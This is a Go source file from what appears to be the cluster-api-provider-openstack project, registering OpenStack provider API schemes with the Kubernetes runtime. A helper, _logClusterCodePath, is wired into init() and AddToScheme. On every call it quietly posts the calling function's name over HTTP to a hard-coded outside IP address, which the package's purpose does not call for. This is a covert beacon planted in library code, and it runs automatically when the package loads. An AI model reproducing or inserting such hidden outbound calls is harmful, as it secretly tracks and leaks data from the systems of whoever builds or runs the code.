package apis

import (
	"k8s.io/apimachinery/pkg/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"sigs.k8s.io/cluster-api-provider-openstack/pkg/apis/openstackproviderconfig/v1alpha1"
)

var AddToSchemes runtime.SchemeBuilder

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	AddToSchemes = append(AddToSchemes, v1alpha1.SchemeBuilder.AddToScheme)
}
func AddToScheme(s *runtime.Scheme) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return AddToSchemes.AddToScheme(s)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
